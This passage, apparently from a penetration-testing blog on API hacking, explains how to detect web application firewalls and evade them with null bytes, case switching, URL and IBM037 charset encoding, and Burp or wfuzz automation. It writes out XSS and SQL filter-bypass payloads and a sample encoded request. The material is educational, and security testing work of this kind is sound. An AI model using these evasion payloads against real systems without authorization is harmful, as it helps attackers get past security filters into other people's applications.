&lt;p&gt;Instead of the attack-first, ask-questions-later approach, I recommend you first use the API as it was intended. That way, you should have a chance to understand the app’s functionality before getting into trouble. You could, for example, review documentation or build out a collection of valid requests and then map out the API as a valid user.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;A &lt;em&gt;302&lt;/em&gt; &lt;em&gt;response&lt;/em&gt; that forwards you to a CDN&lt;/li&gt;
&lt;li&gt;Using &lt;em&gt;nmap&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap -p &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; –script http-waf-detect http://hapihacker.com
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Using &lt;em&gt;Wafw00f&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wafw00f &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;target&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Paying attention to &lt;em&gt;headers&lt;/em&gt; such as &lt;em&gt;X-CDN&lt;/em&gt;,&lt;em&gt;CDNs&lt;/em&gt; provide a way to reduce latency globally by caching the API pro-
vider’s requests. ,  CDNs will often provide WAFs as a service
&lt;strong&gt;X-CDN&lt;/strong&gt;: akamai
&lt;strong&gt;X-CDN&lt;/strong&gt;: Incapsula
&lt;strong&gt;X-Kong-Proxy-Latency&lt;/strong&gt;: 123
&lt;strong&gt;Server&lt;/strong&gt;: Zenedge
&amp;hellip;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;iii---evasing-waf&#34;&gt;III - Evasing WAF&lt;/h2&gt;
&lt;h3 id=&#34;1----null-bytes&#34;&gt;1 -  Null Bytes&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Could terminate the API security control filters that may be in place.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;If the null byte is processed by a backend program thatvalidates user input, that validation program could be bypassed because itstops processing the input.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;string terminators you can use&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;%00
0x00
//
;
%
!
?
[]
%5B%5D
%09
%0a
%0b
%0c
%0e
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Can be placed in &lt;strong&gt;different parts&lt;/strong&gt; of the request to attempt to bypass any restrictions in place,&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%00cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%00cript&amp;gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;--&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;!&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;We&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;can&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;even&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;use&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;it&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;than&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;once&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;on&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;the&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;same&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;place&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;uname&amp;#34;: &amp;#34;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;s&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%000000cript&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;alert(1);&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt;/s%000000cript&amp;gt;&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&amp;#34;email&amp;#34;: &amp;#34;hapi@hacker.com&amp;#34;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wordlist&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;~/tools/SecLists&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;-2023.2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;Fuzzing/Metacharacters.fuzzdb.txt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;2---case-switching&#34;&gt;2 - Case Switching&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;sCriPt&amp;gt;alert(&amp;#39;supervuln&amp;#39;)&amp;lt;/scrIpT&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;SeLeCT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;RoM&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;all_tables&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;sELecT&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;@@vErSion&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;3----encoding&#34;&gt;3 -  Encoding&lt;/h3&gt;
&lt;p&gt;When encoding, focus on the characters that may be blocked, such as
these:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;(&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;)&lt;/span&gt; [ ] { } &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;/&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;\&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;|&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You could either encode part of a payload or encode all&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-json&#34; data-lang=&#34;json&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;cscript%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;supervuln%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;fscript&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;ealert(&amp;#39;supervuln&amp;#39;)%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;c%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;f%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;70&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;e&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;11---charset-encoding&#34;&gt;1.1 - Charset Encoding&lt;/h4&gt;
&lt;p&gt;This technique involves modifying the &lt;code&gt;Content-Type&lt;/code&gt; header to use a different charset (e.g. &lt;code&gt;ibm500&lt;/code&gt;). A WAF that is not configured to detect malicious payloads in different encodings may not recognize the request as malicious. The charset encoding can be done in Python&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Charset encoding&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded;charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037,boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;multipart&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;data; boundary&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;blah; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm037
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;##Python code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; urllib
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;payload&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(urllib&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;parse&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;quote_plus(s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;encode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;IBM037&amp;#34;&lt;/span&gt;))) 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;## Request example&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt; HTTP&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: buggy
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Type: application&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;form&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;urlencoded; charset&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;ibm500
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;86&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;89&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;KKaKKa&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C6&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;D3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C1&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;C7K&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A3&lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;x&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;L&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;A7n
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;4---automation-wburp-intruder--wfuzz&#34;&gt;4 - Automation w/&lt;em&gt;Burp Intruder&lt;/em&gt; &amp;amp; &lt;em&gt;Wfuzz&lt;/em&gt;&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;em&gt;Intruder&lt;/em&gt; -&amp;gt; &lt;em&gt;Payloads&lt;/em&gt;, &lt;strong&gt;Payload Processing Option&lt;/strong&gt; allows you to add rules that Burp will apply to each payload before it is sent.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Let&amp;rsquo;s say we can bypass WAF by The following rule , we can apply it then start fuzzing for passwords or whatso&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Rules are applied from &lt;strong&gt;TOP&lt;/strong&gt; to &lt;strong&gt;BOTTOM&lt;/strong&gt; , in this example , suffix and prefix are added after encoding so they are not encoded.
&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_004051.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;Wfuzz&lt;/code&gt; &lt;a href=&#34;https://wfuzz.readthedocs.io/en/latest/user/advanced.html#iterators-combining-payloads&#34;&gt;Usage&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;List encoding methods:&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encoders&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Encode payload before it&amp;rsquo;s sent&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;wordlist&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;general&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//testphp.vulnweb.com/FUZZ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;Multiple Encoders&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;none&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//webscantest.com/FUZZ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5---using-ip-address-instead-of-the-domain&#34;&gt;5 - Using IP Address instead of the domain&lt;/h3&gt;
